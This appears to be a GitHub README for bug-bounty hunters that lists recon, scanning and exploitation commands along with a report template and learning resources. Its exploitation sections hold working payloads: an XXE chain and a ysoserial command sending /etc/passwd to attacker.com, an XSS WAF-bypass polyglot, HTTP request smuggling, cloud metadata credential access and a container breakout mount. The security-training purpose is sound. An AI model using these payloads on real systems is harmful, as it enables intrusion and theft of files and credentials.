<p align="center">
  <img src="https://media1.tenor.com/m/ZykMLqha0h0AAAAC/%E5%91%AA%E8%A1%93%E5%BB%BB%E6%88%A6-anime.gif" width="450px" alt="CyberSecurity Anime Gif">
</p>

<h1 align="center">🔐 Advanced Bug Bounty Arsenal 🔐</h1>
<h3 align="center">A comprehensive collection of methodologies, tools, and techniques for modern bug hunters (2025 Edition)</h3>

<p align="center">
  <a href="https://github.com/username/bugbounty/issues"><img src="https://img.shields.io/github/issues/username/bugbounty" alt="Issues"></a>
  <a href="https://github.com/username/bugbounty/network/members"><img src="https://img.shields.io/github/forks/username/bugbounty" alt="Forks"></a>
  <a href="https://github.com/username/bugbounty/stargazers"><img src="https://img.shields.io/github/stars/username/bugbounty" alt="Stars"></a>
  <a href="https://github.com/username/bugbounty/blob/main/LICENSE"><img src="https://img.shields.io/github/license/username/bugbounty" alt="License"></a>
</p>

<p align="center">
  <i>Free resources for everyone to become a better bug hunter</i><br>
  <i>Stay curious, hack ethically, and share knowledge freely!</i>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Reconnaissance Techniques](#-reconnaissance-techniques)
- [Vulnerability Discovery](#-vulnerability-discovery)
- [Exploitation](#-exploitation)
- [Post-Exploitation](#-post-exploitation)
- [Reporting](#-reporting)
- [Resources](#-resources)
- [Tools](#-tools)
- [Contributing](#-contributing)
- [License](#-license)

## 🚀 Introduction

This repository contains a carefully curated collection of advanced methodologies, cutting-edge tools, and proven techniques for bug bounty hunting. Whether you're a beginner or an experienced security researcher, this resource will help elevate your hacking skills to the next level.

<details>
<summary>Why Bug Bounty Hunting?</summary>

- **Legal Way to Hack**: Practice your skills in a legitimate environment
- **Financial Rewards**: Earn bounties while learning
- **Career Growth**: Build your resume with real-world experience
- **Community**: Join a global community of security researchers
- **Impact**: Help make the internet more secure for everyone

</details>

## 🔍 Reconnaissance Techniques

### Advanced Subdomain Enumeration

Use a combination of these techniques for maximum coverage:

```bash
# Passive recon using multiple tools
subfinder -d target.com -all | anew subdomains.txt
amass enum -passive -d target.com | anew subdomains.txt
github-subdomains -d target.com -t GITHUB_TOKEN | anew subdomains.txt

# Permutation scanning
dnsgen subdomains.txt | puredns resolve -r resolvers.txt | anew resolved.txt

# Advanced brute forcing
ffuf -u https://FUZZ.target.com -w wordlist.txt -mc 200,403,301,302,307 -o ffuf_results.txt
```

### Visual Reconnaissance

```bash
cat resolved.txt | aquatone -out ./aquatone
gowitness file -f resolved.txt -P ./screenshots --no-http
```

<details>
<summary>👉 Comprehensive Asset Discovery</summary>

1. **API Endpoint Discovery**
   ```bash
   katana -u target.com -jc | grep -E "api|graphql|v1|v2|v3" | anew api_endpoints.txt
   ```

2. **JavaScript Analysis**
   ```bash
   nuclei -t js-endpoints.yaml -l resolved.txt -o js_endpoints.txt
   ```

3. **Cloud Assets Discovery**
   ```bash
   cloudlist -o cloud_assets.txt -t target.com
   s3scanner scan -f domains.txt
   ```

4. **CI/CD Environment Enumeration**
   ```bash
   gitGraber -k keywords.txt -q "org:targetorg"
   nuclei -t cicd-exposed.yaml -l resolved.txt
   ```

5. **Mobile App Reverse Engineering**
   ```bash
   jadx -d output_dir target.apk
   grep -r "https://" ./output_dir
   ```

</details>

## 💉 Vulnerability Discovery

### Modern Web Vulnerabilities

| Category | Vulnerability | Detection Method |
|----------|--------------|------------------|
| API | GraphQL Introspection | `graphw00f -t https://api.target.com/graphql` |
| Auth | OAuth 2.0 Misconfiguration | `nuclei -t oauth-misconfiguration.yaml -l endpoints.txt` |
| Client-Side | DOM Clobbering | `gxss -u "https://target.com/?param=FUZZ" -p payloads.txt` |
| Server-Side | Server Side Template Injection | `tplmap -u "https://target.com/?param=FUZZ"` |
| Access Control | JWT Vulnerabilities | `jwt_tool.py -M at -t "JWT_TOKEN"` |
| Supply Chain | Dependency Confusion | `dependency-check --scan node_modules` |

<details>
<summary>👉 Advanced Testing Techniques</summary>

1. **XSS Polyglots for Bypassing WAFs**
   ```html
   jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
   ```

2. **Race Condition Testing**
   ```bash
   turbo-intruder race_condition.py https://target.com/api/endpoint
   ```

3. **Advanced SSRF to RCE Chains**
   ```bash
   # Use Interactsh for SSRF detection
   interactsh-client
   # Then use the generated URL in your SSRF payloads
   # Example: https://target.com/api/fetch?url=http://INTERACTSH_URL/ssrf
   ```

4. **GraphQL Query Batching Attack**
   ```graphql
   [{"query":"query{user{id name email}}","variables":null},{"query":"query{systemInfo}","variables":null}]
   ```

5. **HTTP Request Smuggling**
   ```http
   POST / HTTP/1.1
   Host: target.com
   Transfer-Encoding: chunked
   Transfer-encoding: cow
   
   0
   
   GET /admin HTTP/1.1
   Host: target.com
   ```

</details>

## 🔓 Exploitation

### Universal XXE Payloads

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
```

Evil.dtd:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;
```

### Advanced SQLi Techniques

```bash
# Time-based blind SQLi automation
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3 --batch --time-sec=1

# Second-order SQL injection
sqlmap -u "https://target.com/page1" --data="username=test&password=test" --second-url="https://target.com/page2" --second-req=req.txt
```

<details>
<summary>👉 Zero-Day Hunting Techniques</summary>

1. **Source Code Mining for Vulnerabilities**
   ```bash
   trufflehog --regex --entropy=False --max_depth=50 https://github.com/target/repo
   ```

2. **Protocol-Level Fuzzing**
   ```bash
   # HTTP/2 Fuzzing
   h2csmuggler -u https://target.com/
   ```

3. **Custom Deserialization Exploits**
   ```java
   // Java deserialization payload generation
   java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/$(cat /etc/passwd)' > payload.bin
   ```

4. **WebSocket Security Testing**
   ```bash
   # Using wscat to connect to WebSocket
   wscat -c wss://target.com/ws
   # Then send payloads to test for vulnerabilities
   ```

5. **IoT Firmware Analysis**
   ```bash
   binwalk -e firmware.bin
   grep -r "password" ./firmware_extracted/
   ```

</details>

## 🔄 Post-Exploitation

### Privilege Escalation

```bash
# Internal Service Discovery
curl internal-api.target.com/v1/users

# SSRF to access cloud metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

<details>
<summary>👉 Internal Network Pivoting</summary>

1. **Container Breakout Techniques**
   ```bash
   # Check if you're in a container
   cat /proc/1/cgroup
   
   # Mount host filesystem
   mkdir -p /tmp/host
   mount /dev/sda1 /tmp/host
   ```

2. **JWT Token Pivoting**
   ```bash
   # Extract and modify JWT to escalate privileges
   jwt-cracker <token> [alphabet] [attempts]
   ```

3. **Using GraphQL for Internal Recon**
   ```graphql
   query {
     __schema {
       types {
         name
         fields {
           name
           description
         }
       }
     }
   }
   ```

</details>

## 📝 Reporting

### Report Template

```markdown
# Vulnerability Report

## Overview
[Brief description of the vulnerability]

## Severity
[Critical/High/Medium/Low]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact
[Describe what an attacker could do with this vulnerability]

## Proof of Concept
[Include screenshots, code, or videos]

## Remediation
[Recommendations for fixing the issue]
```

<details>
<summary>👉 Tips for Better Reports</summary>

1. **Chain Multiple Vulnerabilities**
   - Show how combining low-severity issues can lead to critical impact
   
2. **Include Business Impact**
   - Explain how the vulnerability affects the company's business
   
3. **Create Proof of Concept Code**
   - Make it easy for the team to reproduce your findings
   
4. **Provide Clear Remediation**
   - Give actionable advice on how to fix the issue

5. **Follow Up Responsibly**
   - Be patient and professional in your communications

</details>

## 📚 Resources

### Must-Read Books
- [Real-World Bug Hunting](https://nostarch.com/bughunting) by Peter Yaworski
- [The Web Application Hacker's Handbook](https://portswigger.net/web-security/web-application-hackers-handbook) by Dafydd Stuttard
- [Bug Bounty Bootcamp](https://nostarch.com/bug-bounty-bootcamp) by Vickie Li
- [Hands-On Bug Hunting](https://www.packtpub.com/product/hands-on-bug-hunting-for-penetration-testers/9781789344202) by Joseph Marshall

### Advanced Learning Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

### Bug Bounty Platforms
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [Intigriti](https://www.intigriti.com/)
- [Synack](https://www.synack.com/)
- [YesWeHack](https://www.yeswehack.com/)

## 🛠️ Tools

For a complete list of tools, see [tools list.txt](tools%20list.txt)

<details>
<summary>👉 New Tools (2025)</summary>

1. **Nuclei v3**
   - Advanced vulnerability scanner with machine learning capabilities
   - `nuclei -u https://target.com -t nuclei-templates`

2. **Katana v2**
   - Crawling and spidering framework with JS rendering
   - `katana -u https://target.com -jc -fs screens`

3. **Jaeles v2**
   - Advanced web application scanner
   - `jaeles scan -u https://target.com -s 'cves/,common/'`

4. **httpx v2**
   - Enhanced HTTP toolkit
   - `httpx -l domains.txt -title -tech-detect -status-code`

5. **Feroxbuster**
   - Fast content discovery tool
   - `feroxbuster -u https://target.com -w wordlist.txt`

6. **GF Patterns**
   - Pattern matcher for various vulnerabilities
   - `cat urls.txt | gf xss`

7. **dnsx**
   - Fast and multi-purpose DNS toolkit
   - `dnsx -l domains.txt -a -resp`

8. **Notify**
   - Notification service for bug bounty workflows
   - `notify -data "Target: example.com: XSS found"`

9. **ParamSpider**
   - Mining parameters from web archives
   - `python3 paramspider.py -d target.com`

10. **Dalfox v3**
    - Advanced XSS scanner
    - `dalfox url https://target.com?param=test`

</details>

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request, open an Issue, or suggest new resources.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <i>Knowledge should be free and accessible to all.</i><br>
  <i>Happy hacking! 🔥</i>
</p>

<p align="center">
  <img src="https://media1.tenor.com/m/70XBeW0ZY14AAAAd/belle-zzz.gif" width="300px" alt="Happy Hacking">
</p>
